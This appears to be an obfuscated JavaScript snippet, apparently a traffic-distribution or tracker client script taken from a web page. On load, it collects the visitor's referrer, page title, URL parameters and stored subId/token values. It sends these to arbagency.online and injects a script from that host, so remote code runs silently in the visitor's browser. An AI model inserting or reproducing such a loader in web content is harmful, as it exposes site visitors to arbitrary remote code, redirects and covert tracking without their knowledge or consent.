 (function() {
    var name = '_DnWWN4yCM4jP7wNp';
    if (!window._DnWWN4yCM4jP7wNp) {
        window._DnWWN4yCM4jP7wNp = {
            unique: false,
            ttl: 86400,
            R_PATH: 'http://arbagency.online/nMdpFV',
            P_PATH: 'http://arbagency.online/fec84ce/postback',
        };
    }
    const _Yvn9xvg5qjsJ7Qrb = localStorage.getItem('config');
    if (typeof _Yvn9xvg5qjsJ7Qrb !== 'undefined' && _Yvn9xvg5qjsJ7Qrb !== null) {
        var _xfCMMwNrynCGrVY2 = JSON.parse(_Yvn9xvg5qjsJ7Qrb);
        var _MmKdmHPtxcR44Rvb = Math.round(+new Date()/1000);
        if (_xfCMMwNrynCGrVY2.created_at + window._DnWWN4yCM4jP7wNp.ttl < _MmKdmHPtxcR44Rvb) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _YWkJR63m1HjhfTFc = localStorage.getItem('subId');
    var _RyyGkqCmPyxVLtmG = localStorage.getItem('token');
    var _9QnGPxpjt5jFV4gp = '?return=js.client';
        _9QnGPxpjt5jFV4gp += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _9QnGPxpjt5jFV4gp += '&se_referrer=' + encodeURIComponent(document.referrer);
        _9QnGPxpjt5jFV4gp += '&default_keyword=' + encodeURIComponent(document.title);
        _9QnGPxpjt5jFV4gp += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _9QnGPxpjt5jFV4gp += '&name=' + encodeURIComponent(name);
        _9QnGPxpjt5jFV4gp += '&host=' + encodeURIComponent(window._DnWWN4yCM4jP7wNp.R_PATH);
    if (typeof _YWkJR63m1HjhfTFc !== 'undefined' && _YWkJR63m1HjhfTFc && window._DnWWN4yCM4jP7wNp.unique) {
        _9QnGPxpjt5jFV4gp += '&sub_id=' + encodeURIComponent(_YWkJR63m1HjhfTFc);
    }
    if (typeof _RyyGkqCmPyxVLtmG !== 'undefined' && _RyyGkqCmPyxVLtmG && window._DnWWN4yCM4jP7wNp.unique) {
        _9QnGPxpjt5jFV4gp += '&token=' + encodeURIComponent(_RyyGkqCmPyxVLtmG);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._DnWWN4yCM4jP7wNp.R_PATH + _9QnGPxpjt5jFV4gp;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
